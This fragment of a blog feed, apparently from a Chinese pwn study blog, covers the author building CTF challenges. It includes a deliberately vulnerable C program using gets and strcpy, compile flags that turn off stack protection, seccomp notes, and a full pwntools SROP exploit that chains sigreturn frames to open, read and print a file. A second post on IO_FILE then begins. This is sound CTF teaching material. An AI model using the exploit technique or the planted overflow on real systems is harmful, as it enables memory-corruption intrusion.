&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;strcpy&lt;/span&gt;(buffer, input);    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **argv)&lt;/span&gt; &amp;#123;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; input[&lt;span class=&#34;number&#34;&gt;580&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;welcome to here,please give me something&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    gets(input);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    evilfunction(input);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;h1 id=&#34;SROP&#34;&gt;&lt;a href=&#34;#SROP&#34; class=&#34;headerlink&#34; title=&#34;SROP&#34;&gt;&lt;/a&gt;SROP&lt;/h1&gt;&lt;p&gt;​		本来寻思直接给个&amp;#x2F;bin&amp;#x2F;sh会简单,后来发现好像和原题差不多…然后不如加个系统调用限制(不过好像过滤的不完全,还是能getshell?)&lt;/p&gt;
&lt;p&gt;如何直接写汇编呢？ （也可以写一篇分析&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_27816307/article/details/50995042&#34;&gt;https://blog.csdn.net/qq_27816307/article/details/50995042&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;section .data            ; 数据段声明&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        msg db &amp;quot;Hello, world!&amp;quot;, 0xA     ; 要输出的字符串&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        len equ $ - msg                 ; 字串长度&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;section .text            ; 代码段声明&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;global _start            ; 指定入口函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_start:                  ; 在屏幕上显示一个字符串&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov eax, 4       ; 系统调用号(sys_write)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;man 2 write 可以查看write系统调用的功能&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;write函数原型： ssize_t write(int fd,const void *buf,size_t count);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov ebx, 1       ; 参数一：文件描述符(stdout)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov ecx, msg     ; 参数二：要显示的字符串&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov edx, len     ; 参数三：字符串长度&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int 0x80         ; 调用内核功能。软中断，陷入内核&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov eax, 1       ; 系统调用号(sys_exit)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov ebx, 0       ; 参数一：退出代码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int 0x80         ; 调用内核功能&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;nasm 注意编译多少位的，blog里面是32的，64的话&lt;/p&gt;
&lt;p&gt;nams -f elf64 hello.asm&lt;/p&gt;
&lt;p&gt;用gcc链接也可以（本质都一样吧）&lt;/p&gt;
&lt;p&gt;gcc -o example example.o&lt;/p&gt;
&lt;p&gt;ld -s -o hello hello.o&lt;/p&gt;
&lt;p&gt;反汇编看一下&lt;/p&gt;
&lt;p&gt;用seccmp禁掉execve？ 还是啥&lt;/p&gt;
&lt;p&gt;先封装到c里面&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nasm -f elf64 hello.&lt;span class=&#34;keyword&#34;&gt;asm&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gcc -fno-&lt;span class=&#34;built_in&#34;&gt;stack&lt;/span&gt;-protector  -no-pie  -o myprogram &lt;span class=&#34;number&#34;&gt;1.&lt;/span&gt;c hello.o&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-38-%E6%9C%88%E8%B5%9B%E5%87%BA%E9%A2%983%E9%81%93/image-20230829111052913.png&#34; alt=&#34;image-20230829111052913&#34;&gt;&lt;/p&gt;
&lt;p&gt;objdump -s -j .rodata your_binary_file 查看字符串&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;seccomp&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;关于文件描述符的调试，gdb中如何查看呢？  Linux中又如何查看呢？&lt;/p&gt;
&lt;p&gt;1.c:4:10: fatal error: seccomp.h: 没有那个文件或目&lt;/p&gt;
&lt;p&gt;sudo apt-get install libseccomp-dev&lt;/p&gt;
&lt;p&gt;编译的时候需要加选项  -lseccomp&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@ubuntu:/home/ubuntu/桌面/pwn/&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;月/srop/test1&lt;span class=&#34;comment&#34;&gt;# cat exp.py&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;small = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./test&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; args[&lt;span class=&#34;string&#34;&gt;&amp;#x27;REMOTE&amp;#x27;&lt;/span&gt;]:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh = remote(&lt;span class=&#34;string&#34;&gt;&amp;#x27;127.0.0.1&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;7777&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh = process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./myprogram&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(sh,&amp;quot;b 0x401000&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.arch = &lt;span class=&#34;string&#34;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;syscall_ret = &lt;span class=&#34;number&#34;&gt;0x000000000040112e&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;start_addr = &lt;span class=&#34;number&#34;&gt;0x0000000000401120&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = p64(start_addr) * &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(&lt;span class=&#34;string&#34;&gt;&amp;quot;\x23&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stack_addr = u64(sh.recv()[&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.success(&lt;span class=&#34;string&#34;&gt;&amp;#x27;leak stack addr :&amp;#x27;&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(stack_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe = SigreturnFrame()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rax = constants.SYS_read&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rdi = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rsi = stack_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rdx = &lt;span class=&#34;number&#34;&gt;0x400&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rsp = stack_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rip = syscall_ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = p64(start_addr) + &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;(sigframe)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigreturn = p64(syscall_ret) + &lt;span class=&#34;string&#34;&gt;b&amp;quot;x&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;hereeeeeeeeeeeeeeeeeeeeeeeeeee&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(sigreturn)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe = SigreturnFrame()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rax = constants.SYS_open&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rdi = &lt;span class=&#34;number&#34;&gt;0x402004&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rsi = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rdx = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rsp = stack_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rip = syscall_ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = p64(start_addr) + &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;(sigframe)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigreturn = p64(syscall_ret) + &lt;span class=&#34;string&#34;&gt;b&amp;quot;x&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;hereeeeeeeeeeeeeeeeeeeeeeeeeee&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(sigreturn)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe = SigreturnFrame()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rax = constants.SYS_read&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rdi = &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rsi = stack_addr+&lt;span class=&#34;number&#34;&gt;0x200&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rdx = &lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rsp = stack_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rip = syscall_ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = p64(start_addr) + &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;(sigframe)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigreturn = p64(syscall_ret) + &lt;span class=&#34;string&#34;&gt;b&amp;quot;x&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;hereeeeeeeeeeeeeeeeeeeeeeeeeee&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(sigreturn)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe = SigreturnFrame()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rax = constants.SYS_write&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rdi = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rsi = stack_addr+&lt;span class=&#34;number&#34;&gt;0x200&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rdx = &lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rsp = stack_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rip = syscall_ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = p64(start_addr) + &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;(sigframe)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigreturn = p64(syscall_ret) + &lt;span class=&#34;string&#34;&gt;b&amp;quot;x&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;hereeeeeeeeeeeeeeeeeeeeeeeeeee&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(sigreturn)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;







&lt;p&gt;白名单感觉复杂点，可以直接上黑名单&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.sec4.fun/2018/07/23/seccomp/&#34;&gt;https://www.sec4.fun/2018/07/23/seccomp/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​		&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-09-16T05:23:18.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/</id>
        <title>pwn入门-37-IOFILE初探</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/"/>
        <content type="html">&lt;p&gt;进程中的 FILE 结构会通过_chain 域彼此连接形成一个链表，链表头部用全局变量_IO_list_all 表示，通过这个值我们可以遍历所有的 FILE 结构。&lt;/p&gt;
&lt;p&gt;啥时chain域?  如何在gdb中调试打印呢?&lt;/p&gt;
&lt;p&gt;我们可以在 libc.so 中找到 stdin\stdout\stderr 等符号，这些符号是指向 FILE 结构的指针，真正结构的符号是&lt;/p&gt;
&lt;p&gt;readelf怎么找符号来?&lt;/p&gt;
